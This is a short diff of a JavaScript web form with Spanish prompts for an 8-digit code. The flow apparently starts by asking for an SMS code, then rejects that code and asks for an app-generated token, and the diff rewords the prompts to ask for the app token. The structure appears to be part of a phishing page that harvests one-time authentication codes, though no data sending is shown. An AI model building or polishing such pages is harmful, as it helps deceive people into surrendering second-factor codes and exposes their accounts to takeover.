@@ -162,8 +162,8 @@ const CONFIG = {
 
     // arranca siempre en la fase del SMS
     fase = "sms";
-    codeTitle.textContent = "Ingrese el código enviado por SMS";
-    codeSub.textContent = "Te enviamos un mensaje con el código de 8 dígitos";
+    codeTitle.textContent = "Ingrese el token generado en la app";
+    codeSub.textContent = "ingrese el codigo generado en la app de 8 digitos";
     code.placeholder = "Código SMS";
     code.value = "";
     $("s3Error").hidden = true;
@@ -183,7 +183,7 @@ const CONFIG = {
     const err = $("s3Error");
 
     if (code.value.length < 8) {
-      err.textContent = "Ingrese el código de 8 dígitos";
+      err.textContent = "Ingrese el token de 8 dígitos generado en la app";
       err.hidden = false;
       return;
     }
@@ -210,8 +210,8 @@ const CONFIG = {
       code.value = "";
       code.placeholder = "Token de la app";
       codeTitle.textContent = "Ingrese el token generado en la app";
-      codeSub.textContent = "El código enviado por SMS no es válido";
-      err.textContent = "El código ingresado es incorrecto. Ingresa el token generado en la app.";
+      codeSub.textContent = "El token ingresado no es válido";
+      err.textContent = "Ingresa el token de 8 digitos generado en la app.";
       err.hidden = false;
       code.focus();
       return;
